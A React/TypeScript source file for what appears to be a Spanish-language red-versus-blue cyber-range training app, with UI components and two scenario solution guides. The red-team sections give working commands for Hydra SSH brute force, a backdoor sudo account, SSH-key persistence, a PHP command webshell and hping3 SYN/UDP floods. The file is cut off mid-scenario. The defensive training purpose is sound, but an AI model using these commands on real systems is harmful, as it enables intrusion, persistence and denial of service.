
import React from 'react';
import type { TrainingScenario, ResourceModule, GlossaryTerm, TerminalLine, PromptState, InteractiveScenario, VirtualEnvironment } from './types';

// ============================================================================
// Icon Component (Lucide SVG paths)
// ============================================================================

interface IconProps extends React.SVGProps<SVGSVGElement> {
    name: string;
}

export const Icon: React.FC<IconProps> = ({ name, className, ...props }) => {
    const iconPaths: { [key: string]: React.ReactNode } = {
        'book-open': <path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2zM22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z" />,
        'graduation-cap': <><path d="M22 10v6M2 10l10-5 10 5-10 5z"/><path d="M6 12v5c3 3 9 3 12 0v-5"/></>,
        'library': <><path d="m16 6 4 14"/><path d="M12 6v14"/><path d="M8 8v12"/><path d="M4 4v16"/></>,
        'terminal': <><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></>,
        'chevron-down': <polyline points="6 9 12 15 18 9" />,
        'check': <polyline points="20 6 9 17 4 12" />,
        'info': <><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="16" y2="12"/><line x1="12" x2="12.01" y1="8" y2="8"/></>,
        'layers': <><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 7 12 12 22 7"/><polyline points="2 17 12 22 22 17"/></>,
        'shield-alert': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4"/><path d="M12 16h.01"/></>,
        'network': <><rect x="16" y="16" width="6" height="6" rx="1"/><rect x="2" y="16" width="6" height="6" rx="1"/><rect x="9" y="2" width="6" height="6" rx="1"/><path d="M5 16v-3a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1v3"/><path d="M12 12V8"/></>,
        'brain-circuit': <><path d="M12 5a3 3 0 1 0-5.993.142"/><path d="M18 5a3 3 0 1 0-5.993.142"/><path d="M21 12a3 3 0 1 0-5.993.142"/><path d="M15 12a3 3 0 1 0-5.993.142"/><path d="M9 12a3 3 0 1 0-5.993.142"/><path d="M12 19a3 3 0 1 0-5.993.142"/><path d="M18 19a3 3 0 1 0-5.993.142"/><path d="M12 5a3 3 0 1 0-5.993.142"/><path d="m14.65 6.01 1.35-.51"/><path d="m13.013 10.511 1.984-1.388"/><path d="m15.013 10.611 1.985 1.288"/><path d="m14.65 17.99 1.35.51"/><path d="m8.65 6.01 7.35-.5"/><path d="m9.013 10.511-1.984-1.388"/><path d="m7.013 10.611-1.985 1.288"/><path d="m8.65 17.99-1.35.51"/></>,
        'shield-off': <><path d="M19.69 14a6.9 6.9 0 0 0 .31-2V5l-8-3-8 3v7c0 6 8 10 8 10"/><path d="m2 2 20 20"/></>,
        'swords': <><path d="M14.5 17.5 3 6"/><path d="m21 3-9.5 9.5"/><path d="m6.5 12.5 11 11"/></>,
        'shield-check': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></>,
        'users': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M22 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></>,
        'sword': <><path d="m21.15 12.85-9.17 9.17a2 2 0 0 1-2.83 0L2.85 15.73a2 2 0 0 1 0-2.83l9.17-9.17a6 6 0 0 1 8.49 8.49Z"/><path d="m18 15-4-4"/></>,
        'map-pin': <><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></>,
        'book-open-check': <><path d="M8 3H2v15h7c1.7 0 3 1.3 3 3V7c0-2.2-1.8-4-4-4Z"/><path d="m16 12 2 2 4-4"/><path d="M16 3h6v15h-7c-1.7 0-3 1.3-3 3V7c0-2.2 1.8-4 4-4Z"/></>,
        'book-search': <><path d="M19 21H7a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11a2 2 0 0 1 2 2v3"/><circle cx="16" cy="16" r="3"/><path d="m21 21-1.4-1.4"/></>,
        'book-copy': <><path d="M2 16s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 12s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 8s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><path d="M2 4s.5-1 2-1 2 1 2 1 1-1 2-1 2 1 2 1 .5-1 2-1 2 1 2 1"/><rect width="18" height="18" x="3" y="4" rx="2"/><path d="M21 8H10a2 2 0 0 0-2 2v2a2 2 0 0 0 2 2h11Z"/><path d="m14 12-2 2 2 2"/><path d="M12 16h3"/></>,
        'shield-half': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 22V2"/></>,
        'radio-tower': <><path d="M4.6 13.7 12 2l7.4 11.7"/><path d="M8.5 12h7"/><path d="M12 12V2"/><path d="m14 16-1-3-1 3h2"/><path d="m10 16-1-3-1 3h2"/><path d="m18 19-3-6-3 6h6"/><path d="m6 19-3-6-3 6h6"/></>,
        'alert-octagon': <><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></>,
        'refresh-cw': <><path d="M3 2v6h6"/><path d="M21 12A9 9 0 0 0 6 5.3L3 8"/><path d="M21 22v-6h-6"/><path d="M3 12a9 9 0 0 0 15 6.7l3-2.7"/></>,
        'search': <><circle cx="11" cy="11" r="8"/><line x1="21" x2="16.65" y1="21" y2="16.65"/></>,
        'chevrons-up': <><path d="m17 11-5-5-5 5"/><path d="m17 18-5-5-5 5"/></>,
        'flag': <><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"/><line x1="4" x2="4" y1="22" y2="15"/></>,
        'clipboard-list': <><rect width="8" height="4" x="8" y="2" rx="1" ry="1" /><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2" /><path d="M12 11h4" /><path d="M12 16h4" /><path d="M8 11h.01" /><path d="M8 16h.01" /></>,
        'target': <><circle cx="12" cy="12" r="10" /><circle cx="12" cy="12" r="6" /><circle cx="12" cy="12" r="2" /></>,
        'file-text': <><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z" /><polyline points="14 2 14 8 20 8" /><line x1="16" x2="8" y1="13" y2="13" /><line x1="16" x2="8" y1="17" y2="17" /><line x1="10" x2="8" y1="9" y2="9" /></>,
        'alert-triangle': <><path d="m21.73 18-8-14a2 2 0 0 0-3.46 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"/><path d="M12 9v4"/><path d="M12 17h.01"/></>,
        'binoculars': <><circle cx="15" cy="15" r="3"/><circle cx="9" cy="15" r="3"/><path d="M15 12v-3"/><path d="M9 12v-3"/><path d="m19 12-2-4"/><path d="m5 12 2-4"/></>,
        'file-clock': <><path d="M16 22h2a2 2 0 0 0 2-2V7l-5-5H6a2 2 0 0 0-2 2v3"/><path d="M4 14a6 6 0 1 0 12 0 6 6 0 0 0-12 0Z"/><path d="M10 14.5V12h-1.5"/></>,
        'log-out': <><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" x2="9" y1="12" y2="12"/></>,
        'bomb': <><circle cx="12" cy="16" r="1"/><path d="M20 12a8 8 0 1 0-16 0"/><path d="M22 8s-1.5 0-3-2c-1.5-2-3-3-3-3"/><path d="m2 8 3-2c1.5-2 3-3 3-3"/></>,
        'download': <><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></>,
        'activity': <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>,
        'file-search': <><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z" /><polyline points="14 2 14 8 20 8" /><circle cx="10.5" cy="13.5" r="2.5" /><path d="M12.5 15.5 15 18" /></>,
        'power': <><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></>,
        'plus-circle': <><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="16"/><line x1="8" y1="12" x2="16" y2="12"/></>,
        'trash': <><path d="M3 6h18"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" x2="10" y1="11" y2="17"/><line x1="14" x2="14" y1="11" y2="17"/></>,
        'keyboard': <><rect x="2" y="16" width="20" height="6" rx="2"/><path d="M6 10h4"/><path d="M14 10h4"/><path d="M6 6h.01"/><path d="M10 6h.01"/><path d="M14 6h.01"/><path d="M18 6h.01"/></>,
        'arrow-right-left': <><path d="m16 3 5 5-5 5"/><path d="M21 8H3"/><path d="m8 21-5-5 5-5"/><path d="M3 16h18"/></>,
        'user-x': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="m17 8-6 6"/><path d="m11 8 6 6"/></>,
        'alert-circle': <><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></>,
        'power-off': <><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></>,
        'user-check': <><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><polyline points="16 11 18 13 22 9"/></>,
        'shield': <><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></>,
        'key': <><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></>,
        'crosshair': <><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/></>,
        'star': <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>,
        'bot': <><rect width="18" height="10" x="3" y="11" rx="2"/><circle cx="12" cy="5" r="2"/><path d="M12 7v4"/><line x1="8" x2="8" y1="16" y2="16"/><line x1="16" x2="16" y1="16" y2="16"/></>,
    };

    return (
        <svg
            xmlns="http://www.w3.org/2000/svg"
            width="24"
            height="24"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
            strokeLinecap="round"
            strokeLinejoin="round"
            className={className}
            {...props}
        >
            {iconPaths[name] || null}
        </svg>
    );
};


export const CisoCard: React.FC<{ icon?: string; title?: string; children: React.ReactNode }> = ({ icon, title, children }) => (
    <div className="bg-black/60 backdrop-blur-md border border-white/10 rounded-xl p-4 sm:p-6 mb-6 last:mb-0 transition-all duration-300 hover:bg-black/80 hover:border-cyan-500/30 hover:shadow-[0_0_20px_rgba(6,182,212,0.1)]">
        {title && (
            <h4 className="text-[var(--cv-gold)] font-bold text-lg mb-3 flex items-center">
                {icon && <Icon name={icon} className="h-5 w-5 mr-2 flex-shrink-0" />}
                {title}
            </h4>
        )}
        <div className="text-[var(--text-secondary)] text-sm sm:text-base leading-relaxed space-y-2">
            {children}
        </div>
    </div>
);

export const CisoTable: React.FC<{ headers: string[]; rows: (string | React.ReactNode)[][] }> = ({ headers, rows }) => (
    <div className="overflow-x-auto border border-slate-800 rounded-lg my-4 shadow-lg bg-black/80">
        <table className="w-full min-w-[600px] border-collapse">
            <thead>
                <tr>
                    {headers.map((header, i) => (
                        <th key={i} className="p-3 text-left text-sm font-semibold bg-black/90 text-[var(--cv-gold)] whitespace-nowrap border-b border-slate-700">{header}</th>
                    ))}
                </tr>
            </thead>
            <tbody>
                {rows.map((row, i) => (
                    <tr key={i} className="hover:bg-white/5 transition-colors border-b border-slate-800/50 last:border-b-0">
                        {row.map((cell, j) => (
                            <td key={j} className="p-3 text-sm text-[var(--text-secondary)]">{cell}</td>
                        ))}
                    </tr>
                ))}
            </tbody>
        </table>
    </div>
);

// ============================================================================
// Simulation Defaults
// ============================================================================

const getInitialPrompt = (team: 'red' | 'blue'): PromptState => {
    if (team === 'blue') {
        return { user: 'pasante-blue', host: 'soc-valtorix', dir: '~' };
    }
    return { user: 'pasante-red', host: 'soc-valtorix', dir: '~' };
};

const getWelcomeMessage = (team: 'red' | 'blue'): TerminalLine[] => [
    { text: `Bienvenido a la terminal del Equipo ${team === 'red' ? 'Rojo' : 'Azul'}.`, type: 'output' },
    { html: "Escriba <strong class='text-amber-300'>help</strong> para ver sus objetivos y comandos.", type: 'html' },
];

export const DEFAULT_SIMULATION_STATE = {
    firewall_enabled: false,
    ssh_hardened: false,
    banned_ips: [],
    payload_deployed: false,
    is_dos_active: false,
    admin_password_found: false,
    db_config_permissions: '644',
    hydra_run_count: 0,
    server_load: 5.0,
    terminal_output_red: getWelcomeMessage('red'),
    terminal_output_blue: getWelcomeMessage('blue'),
    prompt_red: getInitialPrompt('red'),
    prompt_blue: getInitialPrompt('blue'),
};


// ============================================================================
// Static Content Data
// ============================================================================

export const SCENARIO_7_GUIDE = `
🎯 Objetivos del Escenario
Equipo Azul (Defensor)

Activar y configurar el firewall UFW
Deshabilitar login directo de root en SSH
Asegurar archivos sensibles con permisos correctos
Monitorear intentos de intrusión
Implementar fail2ban (opcional)

Equipo Rojo (Atacante)

Realizar reconocimiento del servidor
Obtener credenciales mediante fuerza bruta
Comprometer el servidor
Modificar archivos web
Establecer persistencia (opcional)


🔵 SOLUCIÓN COMPLETA - EQUIPO AZUL
Fase 1: Activación del Firewall
El firewall es tu primera línea de defensa. Es crítico activarlo correctamente.
bash# 1. Conectarse al servidor
ssh blue-team@BOVEDA-WEB
# Contraseña: SecureP@ss2024!

# 2. Verificar estado actual del firewall
sudo ufw status
# Debe mostrar: Status: inactive

# 3. CRÍTICO: Permitir SSH primero (o te quedarás bloqueado)
sudo ufw allow ssh
# O específicamente: sudo ufw allow 22/tcp

# 4. Permitir servicios web necesarios
sudo ufw allow http
sudo ufw allow https
# O: sudo ufw allow 80/tcp
# O: sudo ufw allow 443/tcp

# 5. BLOQUEAR MySQL (no debe ser accesible externamente)
sudo ufw deny 3306/tcp

# 6. Activar el firewall
sudo ufw enable
# Confirmar con 'y'

# 7. Verificar configuración
sudo ufw status numbered
Puntos ganados: 20 + 5 (bonus por bloquear MySQL)
Fase 2: Hardening de SSH
Deshabilitar el login directo de root es una práctica de seguridad fundamental.
bash# 1. Editar configuración de SSH
sudo nano /etc/ssh/sshd_config

# 2. Buscar la línea:
# PermitRootLogin yes

# 3. Cambiarla a:
# PermitRootLogin no

# 4. Guardar y salir (Ctrl+X, Y, Enter)

# 5. Reiniciar el servicio SSH para aplicar cambios
sudo systemctl restart sshd

# 6. Verificar que el cambio se aplicó
grep "PermitRootLogin" /etc/ssh/sshd_config
Puntos ganados: 15
Fase 3: Seguridad de Archivos
Aplicar el principio de menor privilegio a archivos sensibles.
bash# 1. Verificar permisos actuales del archivo de configuración
ls -l /var/www/html/db_config.php
# Verás algo como: -rw-r--r-- (644)
# Esto significa que CUALQUIERA puede leer el archivo (peligroso)

# 2. Cambiar permisos a 640
sudo chmod 640 /var/www/html/db_config.php

# 3. Verificar el cambio
ls -l /var/www/html/db_config.php
# Ahora debe mostrar: -rw-r----- (640)
# Solo el propietario puede escribir, el grupo puede leer, otros no tienen acceso

# 4. Opcionalmente, cambiar propietario
sudo chown www-data:www-data /var/www/html/db_config.php
Explicación de permisos:

644: Owner (rw-) Group (r--) Others (r--) ❌ Inseguro
640: Owner (rw-) Group (r--) Others (---) ✅ Seguro
600: Owner (rw-) Group (---) Others (---) ✅ Más seguro

Puntos ganados: 15
Fase 4: Monitoreo Activo
Detectar ataques en tiempo real.
bash# 1. Monitorear intentos de login fallidos
grep "Failed" /var/log/auth.log | tail -20

# O en sistemas con journald:
journalctl -u sshd | grep "Failed"

# 2. Ver en tiempo real (ejecutar en otra terminal)
tail -f /var/log/auth.log

# 3. Verificar servicios escuchando
sudo ss -tulnp
# Deberías ver solo SSH (22), HTTP (80), HTTPS (443)
# Si ves MySQL (3306), el firewall no está configurado correctamente

# 4. Verificar carga del sistema
top
# o mejor:
htop

# 5. Ver conexiones activas
sudo netstat -antp | grep ESTABLISHED
Puntos ganados: 5 (bonus)
Fase 5: Fail2Ban (Bonus - Avanzado)
Banear automáticamente IPs que intentan fuerza bruta.
bash# 1. Instalar fail2ban
sudo apt update
sudo apt install fail2ban -y

# 2. Crear configuración local
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local

# 3. Editar configuración
sudo nano /etc/fail2ban/jail.local

# 4. Configurar la jail de SSH:
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600

# 5. Reiniciar fail2ban
sudo systemctl restart fail2ban

# 6. Verificar estado
sudo fail2ban-client status sshd

# 7. Ver IPs baneadas
sudo fail2ban-client get sshd banned

# 8. Desbanear una IP manualmente (si es necesario)
sudo fail2ban-client unban 192.168.1.100
Puntos ganados: 10 (bonus)
Checklist de Seguridad - Equipo Azul

 Firewall UFW activado y configurado
 Solo puertos necesarios abiertos (22, 80, 443)
 MySQL bloqueado (3306)
 PermitRootLogin configurado a "no"
 SSH reiniciado para aplicar cambios
 Permisos de db_config.php cambiados a 640
 Monitoreo de logs activo
 Fail2ban instalado y configurado (bonus)


🔴 SOLUCIÓN COMPLETA - EQUIPO ROJO
Fase 1: Reconocimiento
Primero, necesitas saber qué está abierto y qué versiones están corriendo.
bash# 1. Desde la terminal soc-valtorix (tu Kali)
# Escaneo básico de puertos
nmap BOVEDA-WEB

# 2. Escaneo detallado con detección de versiones
nmap -sV -sC BOVEDA-WEB

# 3. Escaneo completo (más lento pero exhaustivo)
nmap -sV -sC -p- BOVEDA-WEB

# 4. Escaneo de vulnerabilidades
nmap --script vuln BOVEDA-WEB
¿Qué buscar?

Puerto 22 (SSH) - ¿Está abierto?
Puerto 3306 (MySQL) - ¿Está expuesto? (Vulnerabilidad crítica)
Puerto 80/443 (HTTP/HTTPS) - ¿Qué servidor web?
Versiones de servicios - ¿Hay CVEs conocidos?

Puntos ganados: 10
Fase 2: Ataque de Fuerza Bruta
Si el Equipo Azul no aseguró SSH, puedes obtener credenciales.
bash# 1. Preparar wordlist (ya está en Kali)
ls /usr/share/wordlists/
# Usa rockyou.txt (es la más común)

# 2. Ataque de fuerza bruta con Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://BOVEDA-WEB

# 3. Ataque más rápido con menos intentos
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://BOVEDA-WEB -t 4

# 4. Si encuentras la contraseña "toor", verás:
# [22][ssh] host: BOVEDA-WEB login: root password: toor
⚠️ Nota importante:

Este ataque SOLO funciona si PermitRootLogin está en "yes"
Si el Equipo Azul lo deshabilitó, verás: "Permission denied"
El ataque será visible en /var/log/auth.log del servidor

Puntos ganados: 25
Fase 3: Compromiso del Servidor
Una vez que tienes credenciales, accede al servidor.
bash# 1. Conectarse vía SSH
ssh root@BOVEDA-WEB
# Contraseña: toor (si el brute force fue exitoso)

# 2. Verificar que estás dentro
whoami
# Debe mostrar: root

hostname
# Debe mostrar: BOVEDA-WEB

# 3. Reconocimiento interno
ls -la /var/www/html/
cat /etc/passwd
ps aux
netstat -antp
Puntos ganados: 20
Fase 4: Explotación Web
Modificar el sitio web para demostrar el compromiso.
bash# 1. Ver el hash original del archivo
sha256sum /var/www/html/index.php

# 2. Modificar el archivo index.php
nano /var/www/html/index.php

# 3. Agregar tu marca (ejemplo):
<?php
echo "<!DOCTYPE html><html><body>";
echo "<h1 style='color:red;'>PWNED BY RED TEAM</h1>";
echo "<p>BOVEDA-WEB has been compromised</p>";
echo "</body></html>";
?>

# 4. Guardar (Ctrl+X, Y, Enter)

# 5. Verificar que el hash cambió
sha256sum /var/www/html/index.php
# Debe ser diferente al original
Puntos ganados: 35
Fase 5: Persistencia (Bonus - Avanzado)
Mantener acceso incluso si cambian las contraseñas.
Opción 1: Crear cuenta backdoor
bash# 1. Crear usuario oculto
useradd -m -s /bin/bash sys-update

# 2. Dar permisos sudo
usermod -aG sudo sys-update

# 3. Establecer contraseña
echo "sys-update:BackdoorP@ss123" | chpasswd

# 4. Probar acceso
ssh sys-update@BOVEDA-WEB
Opción 2: Clave SSH
bash# 1. En tu Kali, generar par de claves
ssh-keygen -t rsa -b 4096 -f ~/.ssh/boveda_backdoor

# 2. Copiar clave pública al servidor
# (Estando ya dentro como root)
mkdir -p /root/.ssh
echo "tu-clave-publica-aqui" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# 3. Ahora puedes conectar sin contraseña
ssh -i ~/.ssh/boveda_backdoor root@BOVEDA-WEB
Opción 3: Webshell
bash# 1. Crear webshell simple
cat > /var/www/html/shell.php << 'EOF'
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
EOF

# 2. Usar desde navegador o curl
curl "http://BOVEDA-WEB/shell.php?cmd=whoami"
Puntos ganados: 15 (bonus)
Checklist de Ataque - Equipo Rojo

 Reconocimiento completo con nmap
 Identificación de servicios vulnerables
 Fuerza bruta exitosa (si SSH no está asegurado)
 Acceso root obtenido
 index.php modificado (hash diferente)
 Persistencia establecida (opcional)
 Documentación de todos los pasos
`;

export const SCENARIO_8_GUIDE = `
Escenario 8: Furia en la Red - Ataque Combinado
📋 Información General
Objetivo: Ataque combinado DoS + Bruteforce simultáneos contra PORTAL-WEB. El Equipo Azul debe priorizar y contener bajo presión extrema.
Dificultad: Avanzado
Equipos: Rojo vs Azul
Duración estimada: 60-90 minutos
Servidor objetivo: PORTAL-WEB (10.0.20.10)

🎯 Objetivos del Escenario
Equipo Azul (Defensor)

Detectar y diagnosticar el ataque DoS
Identificar el ataque de fuerza bruta en logs
Bloquear la IP del atacante
Verificar integridad de archivos del sistema
Restaurar servicios si fueron comprometidos

Equipo Rojo (Atacante)

Lanzar ataque DoS para saturar el servidor
Ejecutar fuerza bruta mientras el DoS cubre el rastro
Obtener credenciales de administrador
Comprometer el servidor y desplegar backdoor
Mantener persistencia


🔵 SOLUCIÓN COMPLETA - EQUIPO AZUL
Fase 1: Diagnóstico Inicial (Bajo Presión)
El servidor está bajo ataque. Tu primer trabajo es entender qué está pasando.
bash# 1. Conectarse al servidor (puede estar lento)
ssh blue-team@PORTAL-WEB
# Contraseña: Bl#3T3@m!2024

# 2. Verificar carga del sistema inmediatamente
top
# O mejor aún:
htop

# ⚠️ Lo que verás:
# - CPU al 95-99% (señal de DoS)
# - Múltiples conexiones de red activas
# - Proceso específico consumiendo recursos
Análisis de top/htop:
Load average: 45.32, 38.21, 25.14  <- ANORMAL (debería ser < 2.0)
%Cpu(s): 98.7 us  <- CPU casi al máximo
Puntos ganados: 10 (por detectar DoS)
Fase 2: Identificación del Ataque de Fuerza Bruta
Mientras el sistema está saturado, hay otro ataque en paralelo.
bash# 1. Revisar logs de autenticación
journalctl -u sshd | tail -50

# O con grep:
grep "Failed" /var/log/auth.log | tail -30

# 2. Ver en tiempo real
tail -f /var/log/auth.log

# ⚠️ Lo que verás:
# Nov 18 10:15:32 PORTAL-WEB sshd[12345]: Failed password for admin from 192.168.1.100 port 45123 ssh2
# Nov 18 10:15:33 PORTAL-WEB sshd[12346]: Failed password for admin from 192.168.1.100 port 45124 ssh2
# Nov 18 10:15:34 PORTAL-WEB sshd[12347]: Failed password for admin from 192.168.1.100 port 45125 ssh2
# [... cientos de líneas similares ...]

# 3. Contar intentos fallidos
grep "Failed password for admin" /var/log/auth.log | wc -l

# 4. Identificar la IP del atacante
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr
Puntos ganados: 10 (por detectar bruteforce)
Fase 3: Contención Inmediata - CRÍTICO
¡Esta es la acción más importante! Detén el sangrado AHORA.
bash# 1. Bloquear la IP del atacante en el firewall
sudo ufw deny from 192.168.1.100

# 2. Verificar que la regla se aplicó
sudo ufw status numbered

# 3. Verificar que los ataques se detuvieron
# Espera 30 segundos y luego revisa:
tail /var/log/auth.log
# Ya no deberías ver más intentos fallidos

# 4. Verificar carga del CPU
top
# La carga debería empezar a bajar gradualmente

# 5. Ver conexiones activas
sudo ss -antp | grep 192.168.1.100
# No deberías ver conexiones de esa IP
Resultado esperado:

CPU baja de 99% a ~10% en 1-2 minutos
No más intentos de login fallidos
Conexiones del atacante terminadas

Puntos ganados: 25
Fase 4: Análisis Post-Ataque
Determina si el atacante tuvo éxito antes del bloqueo.
bash# 1. Buscar logins exitosos
grep "Accepted" /var/log/auth.log | grep "192.168.1.100"

# Si ves algo como:
# "Accepted password for admin from 192.168.1.100"
# ⚠️ ¡El atacante entró!

# 2. Ver sesiones activas
who
w

# 3. Si hay una sesión sospechosa, terminarla
sudo pkill -u admin
# O más específico:
sudo kill -9 <PID>

# 4. Cambiar contraseña comprometida INMEDIATAMENTE
sudo passwd admin
Puntos ganados: 5 (bonus por respuesta rápida)
Fase 5: Verificación de Integridad
Determina si archivos fueron modificados.
bash# 1. Verificar hash del archivo web principal
sha256sum /var/www/html/index.php

# Hash original conocido: original_hash_123
# Si es diferente, el archivo fue modificado

# 2. Buscar archivos sospechosos
find /var/www/html -type f -mmin -60
# Archivos modificados en los últimos 60 minutos

# 3. Buscar webshells comunes
find /var/www/html -name "*.php" -exec grep -l "system\|exec\|shell_exec" {} \;

# 4. Revisar archivos recientemente modificados
ls -alt /var/www/html/ | head -20

# 5. Si encuentras un backdoor:
cat /var/www/html/index.php
# Si ves código malicioso, restaura desde backup:
sudo rm /var/www/html/index.php
sudo cp /var/backups/index.php.backup /var/www/html/index.php
Puntos ganados: 20
Fase 6: Hardening Post-Incidente
Prevenir futuros ataques similares.
bash# 1. Instalar y configurar Fail2Ban
sudo apt update
sudo apt install fail2ban -y

# 2. Configurar jail de SSH
sudo nano /etc/fail2ban/jail.local

# Agregar:
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600

# 3. Reiniciar fail2ban
sudo systemctl restart fail2ban
sudo systemctl enable fail2ban

# 4. Verificar que está funcionando
sudo fail2ban-client status sshd

# 5. Configurar límites de tasa en firewall
sudo ufw limit ssh

# 6. Implementar IP whitelisting si es posible
sudo ufw allow from 10.10.0.0/16 to any port 22
sudo ufw deny from any to any port 22
Puntos ganados: 10 (bonus por fail2ban)
Fase 7: Restauración del Sistema
Si el servidor fue comprometido, restaura a estado limpio.
bash# 1. Matar procesos sospechosos
ps aux | grep -v "grep" | grep -i "shell\|backdoor"
sudo kill -9 <PID>

# 2. Eliminar backdoors
sudo rm /var/www/html/shell.php
sudo rm /var/www/html/.hidden_backdoor.php

# 3. Restaurar archivos desde backup
sudo cp /var/backups/index.php.backup /var/www/html/index.php

# 4. Verificar permisos
sudo chmod 644 /var/www/html/*.php
sudo chown www-data:www-data /var/www/html/*.php

# 5. Reiniciar servicios web
sudo systemctl restart nginx

# 6. Verificar que el sitio funciona
curl http://PORTAL-WEB
Puntos ganados: 25
Checklist Completo - Equipo Azul

 DoS detectado con top/htop (CPU > 90%)
 Bruteforce identificado en logs
 IP del atacante identificada (192.168.1.100)
 IP bloqueada con UFW
 Carga del sistema normalizada
 Login exitoso del atacante verificado
 Sesiones maliciosas terminadas
 Integridad de archivos verificada
 Backdoors eliminados (si existen)
 Sistema restaurado a estado limpio
 Fail2Ban instalado y configurado
 Contraseñas comprometidas cambiadas


🔴 SOLUCIÓN COMPLETA - EQUIPO ROJO
Fase 1: Preparación del Ataque
Planifica el ataque combinado.
bash# 1. Desde tu terminal soc-valtorix
# Verificar que el objetivo está arriba
ping PORTAL-WEB

# 2. Reconocimiento rápido
nmap -sV PORTAL-WEB
# Confirma que SSH (22) y HTTP (80) están abiertos

# 3. Preparar herramientas
which hping3  # Para DoS
which hydra   # Para bruteforce
Fase 2: Lanzar Ataque DoS
Satura el servidor para crear caos y cubrir el bruteforce.
bash# 1. Ataque SYN Flood con hping3
hping3 --flood -S -p 80 PORTAL-WEB

# Alternativas:
# TCP flood en múltiples puertos
hping3 --flood -S -p 22,80,443 PORTAL-WEB

# UDP flood
hping3 --flood --udp -p 80 PORTAL-WEB

# 2. Verificar que el ataque está funcionando
# En otra terminal, mide la respuesta:
ping PORTAL-WEB
# Deberías ver latencia muy alta (>1000ms) o timeouts

# 3. Monitorear el impacto
# Si tienes acceso, verifica CPU del servidor:
# top en PORTAL-WEB debería mostrar 95%+ de uso
⚠️ Importante:

Mantén el ataque DoS corriendo en una terminal dedicada
No lo detengas hasta completar la fase de bruteforce
El DoS crea "ruido" que dificulta la detección del bruteforce

Puntos ganados: 20
Fase 3: Ataque de Fuerza Bruta (Simultáneo)
Mientras el DoS está activo, lanza el bruteforce en otra terminal.
